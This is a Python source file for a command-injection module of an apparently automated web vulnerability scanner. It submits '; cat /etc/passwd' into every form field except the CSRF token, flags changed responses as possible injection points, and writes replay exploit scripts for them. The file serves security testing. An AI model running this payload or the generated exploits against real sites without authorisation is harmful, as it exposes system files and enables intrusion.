import httplib2, urllib, urllib2
from BeautifulSoup import BeautifulSoup, SoupStrainer
from urlparse import urljoin, urlparse
from sets import Set

EXPLOIT_PATH = "exploits/"
EXPLOIT_TYPE = "sci"
EXPLOIT_CLASS = "Shell Command Injection"


class SCIModule:
    """
    SCI Module
    Checks for Command Injection vulnerability
    """

    def __init__(self, url, pages):
        self.url = url
        self.pages = pages
        self.logs = {}

    def has_form(self, html_page):
        return len(BeautifulSoup(html_page, parseOnlyThese=SoupStrainer('form'))) != 0

    def parse_form(self, soup):
        form = soup.find('form')
        attributes = []
        for form_input in form.findAll('input'):
            attribute = ()
            for form_input_attr in form_input.attrs:
                if form_input_attr[0] != 'type':
                    if form_input_attr[0] == "name":
                        attribute = (form_input_attr[1], "")
                    elif form_input_attr[0] == "value":
                        attribute = (attribute[0], form_input_attr[1])
            if len(attribute) > 0:
                attributes.append(attribute)
        return attributes

    def create_params(self, params):
        values = {}
        for attr in params:
            if attr[1] == "":
                values[attr[0]] = "a"
            else:
                values[attr[0]] = attr[1]
        return values

    def post_request(self, url, params):
        values = self.create_params(params)
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        rsp = urllib2.urlopen(req)
        return rsp.read()

    def log_results(self, results, category):
        log = {}
        log["class"] = category
        log["results"] = {}
        processed_results = []
        for result in results:
            processed_result = {}
            processed_result["endpoint"] = result[0]
            processed_result["params"] = result[1]
            processed_result["method"] = result[2]
            processed_results.append(processed_result)
        log["results"][self.url] = processed_results
        return log

    def generate_exploits(self):
        counter = 0
        for target in self.logs["results"]:
            for vuln in self.logs["results"][target]:
                fp = open(EXPLOIT_PATH + EXPLOIT_TYPE + str(counter) + ".py", "w")
                fp.write("import urllib, urllib2, cookielib, webbrowser, os\n")
                endpoint = target + vuln["endpoint"]
                if vuln["method"] == "POST":
                   fp.write('url = "'+endpoint+'"\n')
                   fp.write('values = '+str(vuln["params"])+'\n')
                   fp.write('data = urllib.urlencode(values)\n')
                   fp.write('req = urllib2.Request(url, data)\n')
                   fp.write('rsp = urllib2.urlopen(req)\n')
                   fp.write('content = rsp.read()\n')
                   fp.write('tmp_file = "/tmp/tmp.html"\n')
                   fp.write('fp = open(tmp_file, "w")\n')
                   fp.write('fp.write(content)\n')
                   fp.write('fp.close()\n')
                   fp.write('webbrowser.open("file://" + os.path.realpath(tmp_file))\n')
                # elif vuln["method"] == "GET":
                    # TODO: Finish this part
                fp.close()
                counter += 1

    def scan(self):
        results = []
        for web_page in self.pages:
            http = httplib2.Http()
            status, response = http.request(web_page)
            if self.has_form(response):
                soup = BeautifulSoup(response)
                forms = self.parse_form(soup)
                original_response = self.post_request(web_page, forms)
                injection_forms = []
                for form_input in forms:
                    if form_input[0] == "csrftoken": # We don't have incentive to change this
                        injection_forms.append(form_input)
                    else:
                        injection_forms.append((form_input[0], "; cat /etc/passwd"))
                new_response = self.post_request(web_page, injection_forms)
                if original_response != new_response: # That means that the webpage is different, possibly a successful case
                    results.append((urlparse(web_page).path, self.create_params(injection_forms), "POST"))
        self.logs = self.log_results(results, EXPLOIT_CLASS)
